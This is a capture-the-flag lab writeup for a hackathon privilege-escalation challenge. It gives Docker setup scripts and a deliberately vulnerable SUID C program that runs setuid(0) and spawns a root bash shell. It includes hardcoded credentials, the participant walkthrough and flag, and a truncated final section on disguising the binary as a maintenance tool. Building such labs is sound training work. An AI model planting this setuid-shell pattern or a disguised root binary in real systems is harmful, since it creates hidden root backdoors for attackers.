# Privilege Escalation Challenge Writeup

## Overview
This challenge is part of a pentesting lab for a hackathon, focusing on a privilege escalation vulnerability. A misconfigured SUID binary in `/usr/local/bin/vuln` allows a low-privileged user (`tester`) to execute commands as root, enabling access to a flag file located at `/root/flag.txt`. The challenge is hosted in a Docker container based on `ubuntu:22.04`, accessible via SSH.

## Setup Instructions (For Organizers)
This section details how to set up the challenge on a Windows machine using WSL2.

### Prerequisites
- Windows 10/11 with WSL2 enabled.
- Docker Desktop installed with WSL2 integration.
- Git installed for version control.
- An AWS account (optional, for cloud deployment).

### Step-by-Step Setup
1. **Install WSL2 and Ubuntu**:
   - Open PowerShell as Administrator and run:
     ```bash
     wsl --install
     ```
   - Install Ubuntu 22.04 from the Microsoft Store if not automatically installed.
   - Set WSL2 as default: `wsl --set-default-version 2`
   - Launch Ubuntu: `wsl -d Ubuntu-22.04`

2. **Install Docker Desktop**:
   - Download and install Docker Desktop from https://www.docker.com/products/docker-desktop/.
   - Enable WSL2 integration in Docker Desktop: Settings > Resources > WSL Integration > Enable for Ubuntu-22.04.
   - Restart if prompted.

3. **Install Dependencies in WSL2**:
   - In the WSL2 Ubuntu terminal:
     ```bash
     sudo apt update && sudo apt install -y git gcc
     ```

4. **Create Project Directory and Files**:
   - In WSL2, create a directory: `mkdir privesc-lab && cd privesc-lab`
   - Create the following files:
     - **vuln.c**: The vulnerable SUID binary source code.
     - **Dockerfile**: Configures the Ubuntu 22.04 container.
     - **setup.sh**: Script to build and run the container.
   - File contents are provided in the repository (see GitHub).

5. **Build and Run the Container**:
   - Make the setup script executable: `chmod +x setup.sh`
   - Build and run: `./setup.sh`
     - Builds the image as `privesc-lab`.
     - Runs the container, mapping port 2222 (host) to 22 (container).

6. **Test Locally**:
   - SSH into the container: `ssh tester@localhost -p 2222` (password: `password123`)
   - Verify the SUID binary: `find / -perm -4000 2>/dev/null`
   - Run the exploit: `/usr/local/bin/vuln`, then `cat /root/flag.txt`

7. **Push to GitHub**:
   - Initialize Git: `git init`, `git add .`, `git commit -m "Privilege escalation challenge"`
   - Push to GitHub: `git remote add origin <repo-url>`, `git push -u origin main`
   - Ensure your partner has access for integration.

8. **Cloud Deployment (Optional)**:
   - Push the image to Docker Hub: `docker tag privesc-lab <your-dockerhub>/privesc-lab:latest`, `docker push <your-dockerhub>/privesc-lab:latest`
   - Deploy on AWS ECS/EC2, ensuring SSH port 22 is open only to authorized IPs.

### File Contents
- **vuln.c**:
  ```c
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  int main() {
      setuid(0);
      system("/bin/bash");
      return 0;
  }
  ```
- **Dockerfile**:
  ```dockerfile
   FROM ubuntu:22.04
   WORKDIR /usr/src/app
   COPY vuln.c .
   COPY setup_internal.sh /tmp/setup_internal.sh
   RUN chmod +x /tmp/setup_internal.sh && /tmp/setup_internal.sh
   EXPOSE 22
   CMD ["/usr/sbin/sshd", "-D"]
  ```
- **setup.sh**:
  ```bash
  #!/bin/bash
  docker build -t privesc-lab .
  docker run -d -p 2222:22 --name privesc-container privesc-lab
  ```
- **setup_internal.sh**:
  ```bash
   #!/bin/bash
   # Install necessary packages
   apt-get update && apt-get install -y \
       gcc \
       openssh-server \
       && rm -rf /var/lib/apt/lists/*
   # Create a non-root user for SSH access
   useradd -m -s /bin/bash tester && echo 'tester:password123' | chpasswd
   # Set up the vulnerable SUID binary
   gcc -o /usr/local/bin/vuln vuln.c \
       && chown root:root /usr/local/bin/vuln \
       && chmod 4755 /usr/local/bin/vuln
   # Create the flag file
   echo "FLAG{hackathon_privesc_success_2025}" > /root/flag.txt \
       && chown root:root /root/flag.txt \
       && chmod 600 /root/flag.txt
   # Configure SSH
   mkdir -p /var/run/sshd
   echo 'PermitRootLogin no' >> /etc/ssh/sshd_config
  ```
## Challenge Writeup (For Participants)
This section is for hackathon participants to understand and solve the privilege escalation challenge.

### Challenge Description
You have SSH access to a server as the user `tester`. Your goal is to escalate privileges to root and read the flag located at `/root/flag.txt`. The system contains a misconfigured SUID binary that may help you achieve this.

### Connection Details
- **Host**: `<server-ip>` (or `localhost` for local testing)
- **Port**: 2222
- **Username**: `tester`
- **Password**: `password123`

### Steps to Solve
1. **Connect to the Server**:
   - Use SSH to log in:
     ```bash
     ssh tester@<server-ip> -p 2222
     ```
   - Enter the password: `password123`

2. **Identify SUID Binaries**:
   - Search for files with the SUID bit set:
     ```bash
     find / -perm -4000 2>/dev/null
     ```
   - Look for `/usr/local/bin/vuln` in the output.

3. **Analyze the SUID Binary**:
   - Check the binary’s permissions:
     ```bash
     ls -l /usr/local/bin/vuln
     ```
     - Output should show: `-rwsr-xr-x` (the `s` indicates SUID).
   - The binary is owned by `root` and has the SUID bit set, meaning it runs with root privileges.

4. **Exploit the Binary**:
   - Execute the binary:
     ```bash
     /usr/local/bin/vuln
     ```
   - This spawns a root shell (prompt changes to `root@...`).

5. **Read the Flag**:
   - In the root shell, read the flag file:
     ```bash
     cat /root/flag.txt
     ```
   - The flag is: `FLAG{hackathon_privesc_success_2025}`

### Hints
- Look for binaries with the SUID bit set, as they may allow privilege escalation.
- Test what the `vuln` binary does when executed—does it behave unexpectedly?
- Check if you can access restricted files after running the binary.

### Notes
- The flag is only readable by root, so you must escalate privileges to access it.
- Be cautious when running unknown binaries; in this lab, it’s safe but designed to be exploitable.

## Security Considerations
- The container is isolated via Docker, with no external exposure beyond SSH (port 22).
- Root login is disabled (`PermitRootLogin no`) to prevent brute-forcing.
- The flag file is protected (`chmod 600`), ensuring it’s only accessible via the exploit.
- For hackathon cleanup, stop and remove the container: `docker stop privesc-container && docker rm privesc-container`

## GitHub Repository
- All files (`vuln.c`, `Dockerfile`, `setup.sh`) are available in the GitHub repository: `<your-repo-url>`
- Pushed by August 13, 2025, 8 PM, for integration and testing.

<img width="946" height="687" alt="image" src="https://github.com/user-attachments/assets/e3fb7de8-a4b0-48d7-a85d-a519e54252aa" />

### Update: Disguised SUID Binary Behavior
- The binary `/usr/local/bin/vuln` appears to be a normal maintenance tool that cleans temporary files.
- Normal usage:
  ```bash
  /usr/local/bin/vuln
